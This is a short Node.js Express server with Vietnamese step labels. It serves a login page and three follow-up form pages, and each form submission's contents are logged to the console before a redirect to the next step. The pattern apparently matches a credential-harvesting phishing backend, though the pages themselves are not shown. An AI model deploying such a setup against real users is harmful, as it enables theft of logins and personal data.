var express = require("express");
var app = express();
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }))
 
// parse application/json
app.use(bodyParser.json());
app.use(express.static('public'))
app.set('view engine', 'ejs');
app.get("/",(req,res)=>{
    res.render('login');
})

app.get("/Buoc-1",(req,res)=>{
    res.render("buoc1");
})
app.get("/Buoc-2",(req,res)=>{
    res.render("buoc2");
})
app.get("/Buoc-3",(req,res)=>{
    res.render("buoc3");
})
app.post("/actionlogin",(req,res)=>{
    console.log(req.body);
    res.redirect("/Buoc-1");
})
app.post("/actionstep1",(req,res)=>{
    console.log(req.body);
    res.redirect("/Buoc-2");
})
app.post("/actionstep2",(req,res)=>{
    console.log(req.body);
    res.redirect("/Buoc-3");
})
app.post("/actionstep3",(req,res)=>{
    console.log(req.body);
    res.redirect("/");
})
app.listen(80,()=>{
    console.log("APp đang chạy trên port 8000");
})